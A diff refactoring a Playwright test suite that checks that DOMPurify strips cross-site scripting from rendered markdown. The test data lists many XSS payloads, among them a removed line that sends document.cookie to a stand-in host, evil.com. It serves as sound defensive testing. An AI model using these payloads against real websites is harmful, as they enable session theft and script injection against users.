@@ -13,114 +13,75 @@ const {
 /**
  * XSS Prevention Tests
  *
- * Verifies that DOMPurify properly sanitizes HTML rendered from markdown,
- * blocking common XSS attack vectors while preserving safe content.
+ * Verifies that DOMPurify properly sanitizes HTML rendered from markdown.
+ * Test vectors based on OWASP XSS Prevention Cheat Sheet.
  *
- * Test vectors based on OWASP XSS Prevention Cheat Sheet and common payloads.
- *
- * Note: Test payloads containing 'javascript:' URLs are intentional XSS test vectors,
- * not actual code execution. SonarCloud rule S1523 flags these as potential RCE,
- * but they are safe test data strings that verify our sanitization works correctly.
+ * Note: javascript: URLs in test data are intentional XSS test vectors,
+ * not executed code. They verify sanitization works correctly.
  */
 
-/**
- * Unified test case structure for both dangerous and safe content
- * @typedef {Object} ContentTestCase
- * @property {string} name - Descriptive name of the test case
- * @property {string} markdown - Markdown/HTML content to test
- * @property {string} type - 'dangerous' or 'safe'
- * @property {string[]} [shouldNotContain] - Strings that must NOT appear (for dangerous)
- * @property {string} [shouldContain] - String that MUST appear (for safe)
- */
-
-/**
- * Combined test cases for content sanitization verification.
- * Dangerous payloads verify XSS vectors are blocked.
- * Safe content verifies normal markdown is preserved.
- * @type {ContentTestCase[]}
- */
-const CONTENT_TEST_CASES = [
-  // Dangerous: Script and document manipulation
-  { name: 'script tag', type: 'dangerous', markdown: '# Hello\n<script>alert("XSS")</script>', shouldNotContain: ['<script', 'alert('] },
-  { name: 'script tag with encoded content', type: 'dangerous', markdown: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>', shouldNotContain: ['<script', 'document.location', 'document.cookie'] },
-
-  // Dangerous: Event handlers
-  { name: 'img onerror handler', type: 'dangerous', markdown: '<img src="x" onerror="alert(\'XSS\')">', shouldNotContain: ['onerror'] },
-  { name: 'img onload handler', type: 'dangerous', markdown: '<img src="valid.jpg" onload="alert(\'XSS\')">', shouldNotContain: ['onload='] },
-  { name: 'svg onload handler', type: 'dangerous', markdown: '<svg onload="alert(\'XSS\')"><circle r="50"/></svg>', shouldNotContain: ['onload'] },
-  { name: 'body onload handler', type: 'dangerous', markdown: '<body onload="alert(\'XSS\')">', shouldNotContain: ['<body', 'onload'] },
-  { name: 'div onclick handler', type: 'dangerous', markdown: '<div onclick="alert(\'XSS\')">Click me</div>', shouldNotContain: ['onclick'] },
-  { name: 'anchor onmouseover', type: 'dangerous', markdown: '<a href="#" onmouseover="alert(\'XSS\')">Hover me</a>', shouldNotContain: ['onmouseover'] },
-  { name: 'input onfocus', type: 'dangerous', markdown: '<input type="text" onfocus="alert(\'XSS\')" autofocus>', shouldNotContain: ['onfocus'] },
-  { name: 'marquee tag with handler', type: 'dangerous', markdown: '<marquee onstart="alert(\'XSS\')">text</marquee>', shouldNotContain: ['onstart'] },
-  { name: 'svg animate with values', type: 'dangerous', markdown: '<svg><animate onbegin="alert(\'XSS\')"/></svg>', shouldNotContain: ['onbegin'] },
-  { name: 'foreignObject in SVG', type: 'dangerous', markdown: '<svg><foreignObject><body onload="alert(\'XSS\')"/></foreignObject></svg>', shouldNotContain: ['onload'] },
-
-  // Dangerous: JavaScript URLs (test payloads - not executed, just verified as blocked)
-  { name: 'javascript URL in anchor', type: 'dangerous', markdown: '[Click me](javascript:void(0))', shouldNotContain: ['javascript:'] },
-  { name: 'javascript URL in img src', type: 'dangerous', markdown: '<img src="javascript:void(0)">', shouldNotContain: ['javascript:'] },
-  { name: 'form action javascript', type: 'dangerous', markdown: '<form action="javascript:void(0)"><input type="submit"></form>', shouldNotContain: ['javascript:'] },
-  { name: 'meta refresh redirect', type: 'dangerous', markdown: '<meta http-equiv="refresh" content="0;url=javascript:void(0)">', shouldNotContain: ['<meta', 'javascript:'] },
-  { name: 'base tag hijack', type: 'dangerous', markdown: '<base href="javascript:void(0)//">', shouldNotContain: ['<base'] },
-  { name: 'table background javascript', type: 'dangerous', markdown: '<table background="javascript:void(0)"><tr><td>test</td></tr></table>', shouldNotContain: ['javascript:'] },
-  { name: 'video poster javascript', type: 'dangerous', markdown: '<video poster="javascript:void(0)"></video>', shouldNotContain: ['javascript:'] },
-  { name: 'math tag with handler', type: 'dangerous', markdown: '<math><maction actiontype="statusline#http://evil.com" xlink:href="javascript:void(0)">text</maction></math>', shouldNotContain: ['javascript:', 'xlink:href'] },
-
-  // Dangerous: Embedded content tags
-  { name: 'data URL with script', type: 'dangerous', markdown: '<a href="data:text/html,<script>alert(1)</script>">Click</a>', shouldNotContain: ['data:text/html'] },
-  { name: 'iframe injection', type: 'dangerous', markdown: '<iframe src="about:blank"></iframe>', shouldNotContain: ['<iframe'] },
-  { name: 'iframe with srcdoc', type: 'dangerous', markdown: '<iframe srcdoc="<script>alert(1)</script>"></iframe>', shouldNotContain: ['<iframe', 'srcdoc'] },
-  { name: 'object tag', type: 'dangerous', markdown: '<object data="about:blank"></object>', shouldNotContain: ['<object'] },
-  { name: 'embed tag', type: 'dangerous', markdown: '<embed src="about:blank">', shouldNotContain: ['<embed'] },
-  { name: 'link tag stylesheet injection', type: 'dangerous', markdown: '<link rel="stylesheet" href="http://evil.com/style.css">', shouldNotContain: ['<link'] },
-  { name: 'svg script tag', type: 'dangerous', markdown: '<svg><script>alert("XSS")</script></svg>', shouldNotContain: ['<script'] },
-
-  // Safe: Standard markdown elements that must be preserved
-  { name: 'basic paragraph', type: 'safe', markdown: 'This is a paragraph.', shouldContain: '<p>This is a paragraph.</p>' },
-  { name: 'heading with text', type: 'safe', markdown: '# My Heading', shouldContain: '<h1' },
-  { name: 'safe link', type: 'safe', markdown: '[Safe Link](https://example.com)', shouldContain: 'href="https://example.com"' },
-  { name: 'safe image', type: 'safe', markdown: '![Alt text](https://example.com/image.png)', shouldContain: 'src="https://example.com/image.png"' },
-  { name: 'bold text', type: 'safe', markdown: '**bold text**', shouldContain: '<strong>bold text</strong>' },
-  { name: 'italic text', type: 'safe', markdown: '*italic text*', shouldContain: '<em>italic text</em>' },
-  { name: 'inline code', type: 'safe', markdown: '`code snippet`', shouldContain: '<code>code snippet</code>' },
-  { name: 'blockquote', type: 'safe', markdown: '> This is a quote', shouldContain: '<blockquote>' },
-  { name: 'unordered list', type: 'safe', markdown: '- Item 1\n- Item 2', shouldContain: '<ul>' },
-  { name: 'ordered list', type: 'safe', markdown: '1. First\n2. Second', shouldContain: '<ol>' },
-  { name: 'horizontal rule', type: 'safe', markdown: '---', shouldContain: '<hr' },
-  { name: 'table', type: 'safe', markdown: '| Header |\n|--------|\n| Cell   |', shouldContain: '<table>' },
-  { name: 'code block with class', type: 'safe', markdown: '```javascript\nconst x = 1;\n```', shouldContain: 'class="hljs' },
-  { name: 'mailto link', type: 'safe', markdown: '[Email](mailto:test@example.com)', shouldContain: 'href="mailto:test@example.com"' }
+// Dangerous content: [name, markdown, ...shouldNotContain]
+const DANGEROUS_PAYLOADS = [
+  ['script tag', '# Hello\n<script>alert("XSS")</script>', '<script', 'alert('],
+  ['encoded script', '<script>document.location="http://evil.com"</script>', '<script', 'document.location'],
+  ['img onerror', '<img src="x" onerror="alert(1)">', 'onerror'],
+  ['img onload', '<img src="x.jpg" onload="alert(1)">', 'onload='],
+  ['svg onload', '<svg onload="alert(1)"><circle/></svg>', 'onload'],
+  ['body onload', '<body onload="alert(1)">', '<body', 'onload'],
+  ['div onclick', '<div onclick="alert(1)">x</div>', 'onclick'],
+  ['anchor onmouseover', '<a onmouseover="alert(1)">x</a>', 'onmouseover'],
+  ['input onfocus', '<input onfocus="alert(1)" autofocus>', 'onfocus'],
+  ['marquee onstart', '<marquee onstart="alert(1)">x</marquee>', 'onstart'],
+  ['svg animate onbegin', '<svg><animate onbegin="alert(1)"/></svg>', 'onbegin'],
+  ['svg foreignObject', '<svg><foreignObject><body onload="x"/></foreignObject></svg>', 'onload'],
+  ['js url anchor', '[x](javascript:void(0))', 'javascript:'],
+  ['js url img', '<img src="javascript:void(0)">', 'javascript:'],
+  ['js url form', '<form action="javascript:void(0)"></form>', 'javascript:'],
+  ['js url meta', '<meta http-equiv="refresh" content="0;url=javascript:0">', '<meta', 'javascript:'],
+  ['js url base', '<base href="javascript:0//">', '<base'],
+  ['js url table bg', '<table background="javascript:0"><tr><td/></tr></table>', 'javascript:'],
+  ['js url video', '<video poster="javascript:0"></video>', 'javascript:'],
+  ['js url math', '<math xlink:href="javascript:0">x</math>', 'javascript:', 'xlink:href'],
+  ['data url', '<a href="data:text/html,<script>x</script>">x</a>', 'data:text/html'],
+  ['iframe', '<iframe src="about:blank"></iframe>', '<iframe'],
+  ['iframe srcdoc', '<iframe srcdoc="<script>x</script>"></iframe>', '<iframe', 'srcdoc'],
+  ['object', '<object data="about:blank"></object>', '<object'],
+  ['embed', '<embed src="about:blank">', '<embed'],
+  ['link', '<link href="http://evil.com/x.css">', '<link'],
+  ['svg script', '<svg><script>alert(1)</script></svg>', '<script'],
 ];
 
-/**
- * Helper to render markdown and get the wrapper HTML
- * @param {import('@playwright/test').Page} page - Playwright page
- * @param {string} markdown - Content to render
- * @returns {Promise<string>} Lowercase HTML content of the wrapper
- */
+// Safe content: [name, markdown, shouldContain]
+const SAFE_CONTENT = [
+  ['paragraph', 'This is a paragraph.', '<p>this is a paragraph.</p>'],
+  ['heading', '# My Heading', '<h1'],
+  ['link', '[Link](https://example.com)', 'href="https://example.com"'],
+  ['image', '![Alt](https://example.com/x.png)', 'src="https://example.com/x.png"'],
+  ['bold', '**bold**', '<strong>bold</strong>'],
+  ['italic', '*italic*', '<em>italic</em>'],
+  ['code', '`snippet`', '<code>snippet</code>'],
+  ['blockquote', '> Quote', '<blockquote>'],
+  ['ul', '- Item', '<ul>'],
+  ['ol', '1. First', '<ol>'],
+  ['hr', '---', '<hr'],
+  ['table', '| H |\n|---|\n| C |', '<table>'],
+  ['code block', '```js\nx\n```', 'class="hljs'],
+  ['mailto', '[Email](mailto:x@y.com)', 'href="mailto:x@y.com"'],
+];
+
+/** Render markdown and return lowercase wrapper HTML */
 async function renderAndGetHtml(page, markdown) {
   await setCodeMirrorContent(page, markdown);
   await renderMarkdownAndWait(page, WAIT_TIMES.LONG);
   return page.$eval('#wrapper', el => el.innerHTML.toLowerCase());
 }
 
-/**
- * Helper to set up dialog listener for script execution tests
- * @param {import('@playwright/test').Page} page - Playwright page
- * @returns {{ wasTriggered: () => boolean }} Object with method to check if alert was triggered
- */
+/** Set up dialog listener to detect script execution */
 function setupDialogListener(page) {
-  let alertTriggered = false;
-  page.on('dialog', async dialog => {
-    alertTriggered = true;
-    await dialog.dismiss();
-  });
-  return { wasTriggered: () => alertTriggered };
+  let triggered = false;
+  page.on('dialog', async d => { triggered = true; await d.dismiss(); });
+  return { wasTriggered: () => triggered };
 }
-
-// Filter test cases by type for organized test blocks
-const dangerousTests = CONTENT_TEST_CASES.filter(tc => tc.type === 'dangerous');
-const safeTests = CONTENT_TEST_CASES.filter(tc => tc.type === 'safe');
 
 test.describe('XSS Prevention', () => {
   test.beforeEach(async ({ page }) => {
@@ -128,88 +89,76 @@ test.describe('XSS Prevention', () => {
   });
 
   test.describe('Blocks dangerous content', () => {
-    for (const { name, markdown, shouldNotContain } of dangerousTests) {
-      test(`should block XSS via ${name}`, async ({ page }) => {
-        const wrapperHtml = await renderAndGetHtml(page, markdown);
-        for (const forbidden of shouldNotContain) {
-          expect(wrapperHtml, `"${forbidden}" should be stripped for ${name}`).not.toContain(forbidden.toLowerCase());
+    for (const [name, markdown, ...forbidden] of DANGEROUS_PAYLOADS) {
+      test(`blocks ${name}`, async ({ page }) => {
+        const html = await renderAndGetHtml(page, markdown);
+        for (const f of forbidden) {
+          expect(html, `${f} should be stripped`).not.toContain(f.toLowerCase());
         }
       });
     }
   });
 
   test.describe('Preserves safe content', () => {
-    for (const { name, markdown, shouldContain } of safeTests) {
-      test(`should preserve ${name}`, async ({ page }) => {
-        const wrapperHtml = await renderAndGetHtml(page, markdown);
-        expect(wrapperHtml, `"${shouldContain}" should be present for ${name}`).toContain(shouldContain.toLowerCase());
+    for (const [name, markdown, expected] of SAFE_CONTENT) {
+      test(`preserves ${name}`, async ({ page }) => {
+        const html = await renderAndGetHtml(page, markdown);
+        expect(html, `${expected} should exist`).toContain(expected.toLowerCase());
       });
     }
   });
 
   test.describe('Prevents script execution', () => {
-    test('should not execute inline script tags', async ({ page }) => {
+    test('blocks inline scripts', async ({ page }) => {
       const listener = setupDialogListener(page);
-      await renderAndGetHtml(page, '<script>alert("XSS")</script>');
-      expect(listener.wasTriggered(), 'Script should not execute').toBe(false);
+      await renderAndGetHtml(page, '<script>alert(1)</script>');
+      expect(listener.wasTriggered()).toBe(false);
     });
 
-    test('should not execute event handlers', async ({ page }) => {
+    test('blocks event handlers', async ({ page }) => {
       const listener = setupDialogListener(page);
-      await renderAndGetHtml(page, '<img src="x" onerror="alert(\'XSS\')">');
+      await renderAndGetHtml(page, '<img src="x" onerror="alert(1)">');
       await page.waitForTimeout(500);
-      expect(listener.wasTriggered(), 'Event handler should not execute').toBe(false);
+      expect(listener.wasTriggered()).toBe(false);
     });
 
-    test('should not execute javascript URLs on click', async ({ page }) => {
+    test('blocks javascript URLs', async ({ page }) => {
       const listener = setupDialogListener(page);
-      // Using void(0) as a benign test payload instead of alert()
-      await renderAndGetHtml(page, '<a href="javascript:void(0)" id="xss-link">Click me</a>');
+      await renderAndGetHtml(page, '<a href="javascript:void(0)">x</a>');
       const link = await page.$('#wrapper a');
-      if (link) {
-        await link.click().catch(() => { /* Click may fail if href removed - expected */ });
-      }
+      if (link) await link.click().catch(() => {});
       await page.waitForTimeout(500);
-      expect(listener.wasTriggered(), 'javascript: URL should not execute').toBe(false);
+      expect(listener.wasTriggered()).toBe(false);
     });
   });
 
-  test.describe('DOMPurify availability', () => {
-    test('should have DOMPurify loaded globally', async ({ page }) => {
-      const hasDOMPurify = await page.evaluate(() => {
-        return typeof DOMPurify !== 'undefined' && typeof DOMPurify.sanitize === 'function';
-      });
-      expect(hasDOMPurify, 'DOMPurify should be available').toBe(true);
+  test.describe('DOMPurify integration', () => {
+    test('DOMPurify is available', async ({ page }) => {
+      const ok = await page.evaluate(() => typeof DOMPurify?.sanitize === 'function');
+      expect(ok).toBe(true);
     });
 
-    test('should sanitize HTML through DOMPurify.sanitize', async ({ page }) => {
+    test('sanitize removes scripts', async ({ page }) => {
       const result = await page.evaluate(() => {
-        const dirty = '<script>alert("XSS")</script><p>Safe</p>';
-        const clean = DOMPurify.sanitize(dirty);
-        return { hasScript: clean.includes('<script'), hasParagraph: clean.includes('<p>Safe</p>') };
+        const clean = DOMPurify.sanitize('<script>x</script><p>Safe</p>');
+        return { noScript: !clean.includes('<script'), hasPara: clean.includes('<p>Safe</p>') };
       });
-      expect(result.hasScript, 'Script tag should be removed').toBe(false);
-      expect(result.hasParagraph, 'Safe paragraph should be preserved').toBe(true);
+      expect(result.noScript).toBe(true);
+      expect(result.hasPara).toBe(true);
     });
   });
 
   test.describe('Attribute preservation', () => {
-    test('should preserve class attributes for syntax highlighting', async ({ page }) => {
-      await renderAndGetHtml(page, '```python\nprint("hello")\n```');
-      const hasClass = await page.$eval('#wrapper', el => {
-        const code = el.querySelector('code');
-        return code && code.classList.length > 0;
-      });
-      expect(hasClass, 'Code blocks should have class attributes').toBe(true);
+    test('preserves class for syntax highlighting', async ({ page }) => {
+      await renderAndGetHtml(page, '```py\nprint(1)\n```');
+      const hasClass = await page.$eval('#wrapper code', el => el.classList.length > 0);
+      expect(hasClass).toBe(true);
     });
 
-    test('should preserve id attributes for anchor links', async ({ page }) => {
-      await renderAndGetHtml(page, '# Test Heading');
-      const hasId = await page.$eval('#wrapper', el => {
-        const h1 = el.querySelector('h1');
-        return h1 && h1.hasAttribute('id');
-      });
-      expect(hasId, 'Headings should have id attributes').toBe(true);
+    test('preserves id for anchors', async ({ page }) => {
+      await renderAndGetHtml(page, '# Heading');
+      const hasId = await page.$eval('#wrapper h1', el => el.hasAttribute('id'));
+      expect(hasId).toBe(true);
     });
   });
 });
